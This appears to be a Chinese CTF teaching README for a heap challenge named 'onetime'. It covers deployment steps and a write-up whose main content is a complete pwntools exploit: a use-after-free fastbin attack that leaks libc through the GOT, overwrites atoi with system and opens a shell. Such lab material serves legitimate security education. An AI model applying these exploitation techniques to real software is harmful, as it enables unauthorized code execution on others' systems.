# pwn2-堆 onetime


## 介绍

本题主要考验同学们对堆相关漏洞之UAF的掌握，具体来说考察fastbin attack和leak libc的技巧，有一定难度，希望同学们能够在提示下完成。


## 部署

使用`xinetd`来部署题目，用于打包docker镜像的文件位于`onetime`目录下：

1. 修改`bin/flag`为你想要的flag值

2. 将编译好的题目二进制文件`onetime`放置于`bin/`目录下

3. 修改`ctf.xinetd`的`server_args`使其执行题目二进制文件；修改`port`为容器内某自定义端口（e.g., 10030）；

4. 修改Dockerfile中的`EXPOSE`端口与上面的`port`一致

5. 构建容器镜像并创建容器：

    ```bash
    docker built -t onetime .
    docker run -itd -p 31053:10030 --name ctfd_onetime onetime
    ```

6. 执行`nc localhost 31053`来验证题目是否部署成功


## 题解

1. 逆向与验证：程序通过atoi函数实现了五个菜单函数（func1~func5），分别是(1) malloc分配0x60字节的空间给全局指针变量p，(2) 向指针p写入0x40字节，(3) 打印指针p的数据，free指针p但未置空（UAF！），(4) malloc分配0x60字节的空间，(5) 分配0x60字节，并写入0x60字节。

2. 攻击思路：在bss段上找到⼀个fake chunk，并且可以控制指针p，使指针p指向got表中atoi位置然后leak libc改写got表atoi为system即可。

3. exploit编写：

```python
#!/usr/bin/env python3
from pwn import *
# context.log_level = "debug" # enable to see debug info

# to test locally, use process("./onetime")
p = remote("server_ip", 31053)
libc = ELF("./onetime.so")  # should be in the same directory

# wrap the interaction with menu
def cmd(c):
    p.recvuntil("your choice >>\n")
    p.sendline(str(c))

# ========================
# Stage 1: exploit fastbin attack to leak the address of atoi
# ========================

# 1. allocate one chunk
cmd(1)

# 2. free the chunk, which will be inserted to fastbin link
cmd(4)

# 3. rewrite the first 8 bytes of the chunk through payload, 
#    which points the fd to a controled address (0x60208d)
cmd(2)
p.recvuntil("fill content:")
# 0x60208d is the address of a valid fake chunk (0x60207d is also ok, then offset_to_chunk should be 0x1b)
payload = p64(0x60208d)
p.sendline(payload)

# 4. allocate one chunk again, where fastbin will return the just freed chunk
#    now, the head of fastbin link has been rewriten with our fake fd (0x60208d)
cmd(1)

# 5. allocate another chunk, we will get the chunk that the fake fd points to
cmd(5)
p.recvuntil("Hero! Leave your name:")
# points p to GOT[atoi]：
#  - fill the first 0xb bytes with 0, to align with the chunk size position and reset has_2 to zero at the same time!
#  - then write p64(0x602058), pointing p to GOT[atoi]
#  - the last two p64(0) is not necessary, they will reset all has_N to zero
offset_to_size = 0xb
p.send(b"\x00" * offset_to_size + p64(0x602058) + p64(0) * 2)

# 6. print p in string format, which is actually printing the real address of atoi through jumping from GOT
cmd(3)
# 0-4 is "data:", we only process the received 5-11 bytes as address of atoi, and completing it with two 0
leak = u64((p.recvuntil("your choice >>\n")[5:11]).ljust(8, b'\x00'))
log.info("Leaked address: " + hex(leak))

# calc libc_base and address of system
libc_base = leak - libc.sym['atoi']
log.info("libc base: " + hex(libc_base))
sys_addr = libc_base + libc.symbols['system']

# ========================
# Stage 2: rewrite GOT, replace atoi with system
# ========================

# use the previously constructed fastbin attack chain, we rewrite the GOT[atoi] with sys_addr
p.send(b"2")
p.recvuntil("fill content:")
# construct payload to rewrite GOT[atoi] to system address
payload = p64(sys_addr)
p.send(payload)

# when calling atoi, it actually calling system, with param 'sh'
cmd('sh')
p.interactive()
```

4. 获取flag：执行`exploit.py`获取到shell之后，通过`cat flag`获取flag。